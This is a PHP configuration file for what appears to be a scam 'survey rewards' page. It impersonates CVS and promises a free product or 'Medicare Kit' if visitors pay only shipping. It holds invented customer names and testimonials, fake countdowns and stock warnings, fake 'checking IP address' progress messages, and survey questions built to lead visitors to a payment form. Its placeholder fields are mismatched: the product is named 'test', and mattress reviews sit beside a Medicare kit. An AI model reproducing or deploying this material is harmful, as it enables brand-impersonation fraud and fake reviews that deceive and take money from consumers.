<?php

// product
$product = "test";
$description = "serta";
$price = "149.99";
$productImage = "/templates/products/birk-product.png";
$commentImage1 = "/templates/products/birl-comm1.jpg";
$commentImage2 = "/templates/products/birk-comm2.jpg";
$wallID = "1";

// brand
$name = "CVS";
$brandLogo = "/templates/brands/s3cveqn3hmc.png";
$favicon = "/templates/brands/xbuarqe53ce.png";
$backgroundImage = "/templates/brands/b5jb9tod1re.png";
$mainColor = "rgb(238,0,0)";
$secondaryColor = "rgb(34,34,34)";
$headerColor = "rgb(238,0,0)";
$white = "";

// geo
$geo = "us";
$langTag = "en";
$currency = "$";
$commentName1 = "Elizabeth Brown";
$commentName2 = "John Wilson";
$commentName3 = "Jennifer Jones";
$commentName4 = "Steven Jackson";
$commentName5 = "Dorothy Harris";
$profilePic1 = "/templates/geos/1_us.jpg";
$profilePic2 = "/templates/geos/2_us.jpg";
$profilePic3 = "/templates/geos/3_us.jpg";
$profilePic4 = "/templates/geos/4_us.jpg";
$profilePic5 = "/templates/geos/5_us.jpg";
$flagLogo = "/templates/geos/flaglogo_us.png";

// texts
$texts = [
    "tryetco" => [
        "title" => "Survey Rewards",
        "text1" => "Over $4,000,000 in Offers given out so far!",
        "text2" => "Survey About",
        "text3" => "Dear CVS Shopper,",
        "text4" => "We would like to offer you a unique opportunity to receive a brand new",
        "text5" => "To claim, simply take this short survey about your experience with",
        "text6" => "Attention!",
        "text7" => "This survey offer expires today,",
        "text8" => "START SURVEY",
        "text9" => "Please wait while we process your answers...",
        "text10" => "Submitting answers...",
        "text11" => "Checking for duplicate IP addresses...",
        "text12" => "Checking our inventory for products...",
        "text13" => "Congratulations...",
        "text14" => "Answers submitted",
        "text15" => "IP address checked",
        "text16" => "Products available in stock",
        "text17" => "Thank you for completing the survey!",
        "text18" => "Because you helped provide extremely valuable consumer data, you may now choose some of the following exclusive rewards below.",
        "text19" => "Please note that if you leave this page without claiming your reward, we have no choice but to give another visitor a chance to participate in our rewards program.",
        "text20" => "Price:",
        "text21" => "Left in Stock:",
        "text22" => "Pay only for shipping!",
        "text23" => "CLAIM REWARD",
        "text24" => "New Comment",
        "text25" => "Comments (5)",
        "text26" => "Submit",
        "text27" => "I just received this through email and gave it a try. Excited to get my reward! Can I also send the survey to my friends?",
        "text28" => "Actually got a prize from this survey! I was skeptical at first but gave it a try. And look what just arrived in the mail!",
        "text29" => "Lol such a cool survey but too bad I didn&#x27;t get any prize.. ",
        "text30" => "I usually dont take these kind of online surveys but this is actually a good one!! We will put this prize to good use thanks so much!!",
        "text31" => "Where can I do more surveys like these? I like getting prizes :)",
        "text32" => "This website is not affiliated with or endorsed by CVS or any similar brand and does not claim to represent or own any of the trademarks, trade names or rights associated with any of the products which are the property of their respective owners who do not own, endorse, or promote this website.",
        "text33" => "*Products offered on the last page require shipping and handling fees. See manufacturer&#x27;s site for details as terms vary with offers. See important terms and conditions regarding this survey, website and advertisement.",
        "text34" => "*Important: Shipping costs may apply.",
        "text35" => "Offer expires in",
        "text36" => "Congratulations!",
        "text37" => "We have reserved (1)",
        "text38" => "exclusively for you.",
        "text39" => "How to claim your",
        "text40" => "Fill in your shipping address.",
        "text41" => "Pay only shipping costs to receive your prize.",
        "text42" => "Your prize will be delivered in 5-7 working days.",
        "text43" => "Continue",
        "like" => "Like",
        "reply" => "Reply",
        "montharray" => "January, February, March, April, May, June, July, August, September, October, November, December",
    ],
    "walp" => [
        "text1" => "Exclusive Offer",
        "text4" => "START SURVEY",
        "surveyTitle" => "Help us improve your shopping experience",
        "question" => "Question",
        "totalQuestions" => "8 questions total",
        "text6" => "Processing Your Response",
        "text7" => "Please wait while we check your eligibility...",
        "text8" => "Congratulations!",
        "text10" => "LIMITED STOCK",
        "text11" => "Regular Price:",
        "text12" => "Your Price:",
        "text13" => "Just pay shipping &amp; handling",
        "text14" => "Claim Your Prize Now",
        "text15" => "Offer expires in:",
        "text16" => "Recent Comments:",
        "text17" => "2 hours ago",
        "verified" => "Verified",
        "text18" => "I just received this through email and gave it a try. Excited to get my reward! Can I also send the survey to my friends?",
        "text19" => "8 hours ago",
        "text20" => "Actually got a prize from this survey! I was skeptical at first but gave it a try. And look what just arrived in the mail!",
        "text21" => "1 day ago",
        "text22" => "Lol such a cool survey but too bad I didn&#x27;t get any prize.. ",
        "text23" => "1 day ago",
        "text24" => "New Comment!",
        "text25" => "1 day ago",
        "commentt" => "Where can I do more surveys like these? I like getting prizes!",
        "text27" => "Privacy Policy",
        "text28" => "Terms of Service",
        "text29" => "Contact Us",
        "text31" => "*Important: Shipping costs may apply.",
        "title" => "Customer Survey",
        "one" => "Answers Submitted",
        "two" => "Checking IP Address",
        "three" => "Checking Product Availability",
        "four" => "Verifying Eligibility",
        "five" => "Preparing Reward",
        "send" => "Send",
        "questionCount1" => 'Question 1 on 8',
        "questionCount2" => 'Question 2 on 8',
        "questionCount3" => 'Question 3 on 8',
        "questionCount4" => 'Question 4 on 8',
        "questionCount5" => 'Question 5 on 8',
        "questionCount6" => 'Question 6 on 8',
        "questionCount7" => 'Question 7 on 8',
        "questionCount8" => 'Question 8 on 8',
        "text2" => "Win a test!",
        "text5" => "What The Customers Say About This Product",
        "text3" => "Share your shopping experience with CVS and get a chance to win a test worth over $149.99.",
        "text9" => "You&#x27;ve been selected to receive a test",
        "text30" => "This website is not affiliated with or endorsed by CVS or any similar brand and does not claim to represent or own any of the trademarks, trade names or rights associated with any of the products which are the property of their respective owners who do not own, endorse, or promote this website. *Products offered on the last page require shipping and handling fees. See manufacturer&#x27;s site for details as terms vary with offers. See important terms and conditions regarding this survey, website and advertisement.",
        "feature1" => "Experience unparalleled comfort with Serta&#x27;s premium support and cushioning.",
        "feature2" => "Invest in quality sleep with Serta&#x27;s durable and long-lasting construction.",
        "feature3" => "Discover Serta&#x27;s wide range of styles and options to perfectly match your needs and preferences.",
        "review1" => "This Serta mattress is incredibly comfortable. I&#x27;ve had a good night&#x27;s sleep every night since purchasing it.  Definitely worth the investment!",
        "review2" => "The Serta support is fantastic!  I love how it cradles my body without feeling too firm or too soft.  A great choice for a restful sleep.",
        "review3" => "I&#x27;m very happy with the Serta.  It&#x27;s a quality product and feels luxurious.  I highly recommend it.",
    ]
];


$survey = array(
    array("How often do you shop at CVS?", "Multiple times a week", "Once a week", "A few times a month", "Rarely or never"),
    array("What draws you to shop at CVS?", "Convenience of location", "Product selection", "Prices and deals", "Loyalty rewards program"),
    array("How do you typically respond to CVS ads?", "I look for needed items", "I browse for deals", "I consider visiting for promotions", "I usually ignore the ads"),
    array("If you won a Medicare Kit from CVS, how would your opinion of CVS change?", "Significantly more positive", "Somewhat more positive", "No change", "More negative"),
    array("Which feature of the Medicare Kit is most appealing?", "Durability", "Cooling efficiency", "Portability", "Design and appearance"),
    array("How likely would you be to use a CVS Medicare Kit?", "Very likely", "Somewhat likely", "Unlikely", "I would not use it"),
    array("How well does CVS meet your health and wellness needs?", "Exceeds my needs", "Meets my needs well", "Adequately meets my needs", "Does not meet my needs"),
    array("How likely are you to participate in future CVS promotions or surveys?", "Very likely", "Somewhat likely", "Not very likely", "Not at all likely"),
);

?>